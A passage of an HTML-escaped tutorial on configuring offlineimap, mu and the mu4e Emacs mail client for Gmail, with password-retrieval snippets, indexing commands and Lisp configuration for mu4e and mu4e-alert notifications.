In Case Of Using &lt;strong&gt;GPG ENCRYPTED PASSWORD&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#! /usr/bin/env python2
# In side of offlineimap.py
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check_output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gpg -dq ~/.password-store/gmail.gpg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Incomment pythonfile in [general]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Remove oauth2* settings in [Repository Remote] and add&lt;/span&gt;
remotepasseval &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; get_password&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In Case of Using &lt;strong&gt;Plain Text Password&lt;/strong&gt; Or &lt;strong&gt;Plain Password File&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove oauth2* settings in [Repository Remote] &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Add for plain text passowrd&lt;/span&gt;
remotepass &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mypassword
&lt;span class=&quot;c&quot;&gt;# Or Password file&lt;/span&gt;
remotepassfile &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/gmail_app
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;getting-mail&quot;&gt;Getting Mail&lt;/h2&gt;
&lt;p&gt;Now Once You’ve done all the previous steps , there’s one last step to do and that is to get mail to your inbox, simply run the following command to start getting ur mail.&lt;/p&gt;
&lt;h3 id=&quot;offlineimap&quot;&gt;Offlineimap&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offlineimap
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;mu&quot;&gt;Mu&lt;/h3&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mu init &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; ~/Mail &lt;span class=&quot;nt&quot;&gt;--my-address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;USERMAIL@gmail.com 
mu index
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And you’re finally done, you’ll now down all ur mail and it will be indexed automatically .&lt;/p&gt;
&lt;h2 id=&quot;setting-up-mu4e-in-emacs&quot;&gt;Setting Up mu4e in emacs&lt;/h2&gt;
&lt;p&gt;There isn’t much to do with  &lt;strong&gt;mu4e&lt;/strong&gt; in &lt;strong&gt;emacs&lt;/strong&gt; besides adding our configurations.
My configurations is the following .&lt;/p&gt;
&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;add-to-list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'load-path&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/emacs/site-lisp/mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;with-eval-after-load&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'mu4e&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'ask-if-none&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;mu4e-compose-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'pick-first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-change-filenames-when-moving&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;;; refresh mail using isync every 10 minutes&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-update-interval&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;;; Comment out mu4e-mu-binary if u have mu installed in /usr/bin/ or something&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-mu-binary&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Downloads/mu-1.6.6/mu/mu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-get-mail-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mbsync -a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-root-maildir&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bind-key&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C-c C-m&quot;&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'mu4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-html2text-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w3m -dump -T text/html -o display_link_number=true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;;; (setq mu4e-html2text-command &quot;html2markdown | grep -v '&amp;amp;nbsp_place_holder;'&quot;)&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;set-email-account!&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Personal&quot;&lt;/span&gt;
                      &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-sent-folder&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-drafts-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-refile-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/All Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-trash-folder&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user-mail-address&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;USERMAIL@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user-full-name&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Dr Drunkenstein&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-compose-signature&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Signed By Mando&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-user&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;USERMAIL@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-server&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;smtp.gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-stream-type&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-service&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;465&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                      &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-maildir-shortcuts&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/inbox&quot;&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/All Mail&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;extra-configurations&quot;&gt;Extra Configurations&lt;/h3&gt;
&lt;p&gt;if you want mail notifications and modeline alert of how many mails u have unread , you’ll need an extra package called &lt;strong&gt;mu4e-alert&lt;/strong&gt;.
You can install it through &lt;a href=&quot;https://melpa.org/#/mu4e-alert&quot;&gt;Melpa&lt;/a&gt;  using &lt;strong&gt;package-install&lt;/strong&gt; or through &lt;strong&gt;use-package&lt;/strong&gt;
My Configurations for it is .&lt;/p&gt;
&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;use-package!&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:after&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e&lt;/span&gt;
  &lt;span class=&quot;ss&quot;&gt;:config&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;doom-modeline-mu4e&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-notifications&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-set-default-style&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'libnotify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;map!&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:leader&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:prefix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Disable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-disable-mode-line-display&lt;/span&gt;
         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Enable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defvar&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;paplay&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/sounds/freedesktop/stereo/message.oga&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;Cons list with command to play a sound, and the sound file to play.
                 Disabled when set to nil.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-email-notification-types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defun&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_all-mails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;Default function to format MAIL-GROUP for notification.
                 ALL-MAILS are the all the unread emails&quot;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;start-process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cdr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;let*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail-count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;first-mail&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title-prefix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You have %d unread emails&quot;&lt;/span&gt;
                                     &lt;span class=&quot;nv&quot;&gt;mail-count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;field-value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert--get-group&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;first-mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title-suffix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pcase&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-group-by&lt;/span&gt;
                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;from %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:to&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;to %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:maildir&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:priority&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;with %s priority:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:flags&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;with %s flags:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                                     &lt;span class=&quot;nv&quot;&gt;field-value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s %s&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title-prefix&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title-suffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:title&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt;
                &lt;span class=&quot;ss&quot;&gt;:body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s-join&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mapcar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s&amp;lt;b&amp;gt;%s&amp;lt;/b&amp;gt; • %s&quot;&lt;/span&gt;
                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cond&lt;/span&gt;
